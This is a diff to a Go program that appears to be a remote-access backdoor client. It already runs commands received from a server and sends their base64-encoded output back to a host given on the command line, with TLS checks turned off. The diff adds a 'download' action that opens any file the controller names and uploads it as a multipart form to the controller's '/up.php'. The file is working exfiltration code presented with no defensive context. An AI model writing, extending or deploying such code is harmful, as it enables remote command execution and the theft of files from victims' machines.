@@ -8,8 +8,11 @@ import (
    "os"
    "time"
    "io/ioutil"
+   "io"
    "strings"
    "os/exec"
+   "mime/multipart"
+   "bytes"
 )
 
 
@@ -36,6 +39,25 @@ hey()
 
 }
 
+func createForm(form map[string]string) (string, io.Reader, error) {
+   body := new(bytes.Buffer)
+   mp := multipart.NewWriter(body)
+   defer mp.Close()
+   for key, val := range form {
+      if strings.HasPrefix(val, "@") {
+         val = val[1:]
+         file, err := os.Open(val)
+         if err != nil { return "", nil, err }
+         defer file.Close()
+         part, err := mp.CreateFormFile(key, val)
+         if err != nil { return "", nil, err }
+         io.Copy(part, file)
+      } else {
+         mp.WriteField(key, val)
+      }
+   }
+   return mp.FormDataContentType(), body, nil
+}
 
 func hey(){
 
@@ -73,6 +95,37 @@ for _, line := range strings.Split(strings.TrimRight(cmds, "\n"), "\n") {
       b64Output := b64.StdEncoding.EncodeToString([]byte(string(Output)))
       http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
       gimme, err := http.Get(os.Args[2]+"/res.php?res="+b64Output+"&id="+id)
+      if err != nil {
+	fmt.Println(err)
+	}
+      fmt.Println(gimme)	
+      }
+      
+      
+      
+      
+      
+      if act == "download"{
+      file := strings.Join(strings.Split(line, ":")[2:], ":")
+      form := map[string]string{"data": "@"+file}
+   ct, body, err := createForm(form)
+   if err != nil {
+      panic(err)
+   }
+      fmt.Println(line)
+      
+     
+      http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
+      
+      filemsg :="Uploading " + string(file)
+      filemsgEnc := b64.StdEncoding.EncodeToString([]byte(filemsg))
+      
+      msgup, err := http.Get(os.Args[2]+"/res.php?res="+filemsgEnc+"&id="+id)
+      if err != nil {
+	fmt.Println(err)
+	}
+      fmt.Println(msgup)
+      gimme, err := http.Post(os.Args[2]+"/up.php?id="+id, ct, body)
       if err != nil {
 	fmt.Println(err)
 	}
